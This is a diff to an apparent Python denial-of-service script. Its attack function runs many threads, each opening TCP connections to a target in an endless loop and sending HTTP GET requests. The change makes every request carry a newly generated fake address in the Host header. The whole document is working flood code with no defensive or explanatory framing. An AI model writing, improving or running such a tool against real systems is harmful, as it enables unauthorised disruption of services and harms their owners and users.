@@ -4,11 +4,12 @@ from handler import args_handler
 from ipgen import fake_ip_gen
 
         
-def attack(target, port, fake_ip):
+def attack(target, dport):
     try:
         while True:
+            fake_ip = fake_ip_gen()
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
+            s.connect((target, dport))
             s.send(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
             s.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
             s.close()
@@ -17,13 +18,10 @@ def attack(target, port, fake_ip):
 
  
 def main():
-    target_ip, port, num_threads = args_handler() 
-
-    fake_ip = fake_ip_gen()
-    print(fake_ip)
+    target_ip, dport, num_threads = args_handler() 
 
     for i in range(num_threads):
-        thread = threading.Thread(target=attack, args=(target_ip, port, fake_ip))
+        thread = threading.Thread(target=attack, args=(target_ip, dport))
         thread.start()
 
   
